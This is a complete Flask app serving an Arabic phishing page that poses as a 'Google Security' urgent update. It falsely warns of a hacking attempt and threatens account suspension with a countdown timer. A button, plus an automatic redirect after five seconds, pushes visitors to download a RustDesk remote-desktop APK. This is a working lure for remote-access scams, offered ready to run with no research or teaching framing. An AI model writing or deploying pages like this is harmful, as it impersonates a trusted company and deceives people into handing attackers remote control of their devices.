from flask import Flask, render_template_string

app = Flask(__name__)

PAGE = """
<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث أمني - Google</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .icon { font-size: 60px; margin-bottom: 20px; }
        h1 { color: #333; font-size: 24px; margin-bottom: 10px; }
        .sub { color: #666; font-size: 14px; margin-bottom: 20px; }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffc107;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-size: 14px;
            color: #856404;
        }
        .btn {
            background: #4285f4;
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 18px;
            cursor: pointer;
            width: 100%;
            text-decoration: none;
            display: inline-block;
        }
        .btn:hover { background: #3367d6; }
        .footer { margin-top: 20px; font-size: 12px; color: #999; }
        .timer { color: #dc3545; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">🔒</div>
        <h1>تحديث أمني عاجل</h1>
        <p class="sub">تم اكتشاف ثغرة أمنية في جهازك</p>
        <div class="warning">⚠️ تم رصد محاولة اختراق لحسابك.<br>يرجى تحديث التطبيق الأمني فوراً.</div>
        <a href="https://download.rustdesk.com/rustdesk/rustdesk-1.3.3-arm64-sc.apk" class="btn">📥 تحميل التحديث الآن</a>
        <p style="margin-top: 15px; font-size: 13px; color: #666;">
            سيتم تعطيل حسابك خلال <span class="timer" id="timer">24:00:00</span>
        </p>
        <div class="footer">© 2027 Google Security - جميع الحقوق محفوظة</div>
    </div>
    <script>
        let time = 86400;
        setInterval(function() {
            time--;
            let hours = Math.floor(time / 3600);
            let minutes = Math.floor((time % 3600) / 60);
            let seconds = time % 60;
            document.getElementById('timer').textContent = 
                String(hours).padStart(2, '0') + ':' +
                String(minutes).padStart(2, '0') + ':' +
                String(seconds).padStart(2, '0');
        }, 1000);
        setTimeout(function() {
            window.location.href = 'https://download.rustdesk.com/rustdesk/rustdesk-1.3.3-arm64-sc.apk';
        }, 5000);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(PAGE)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
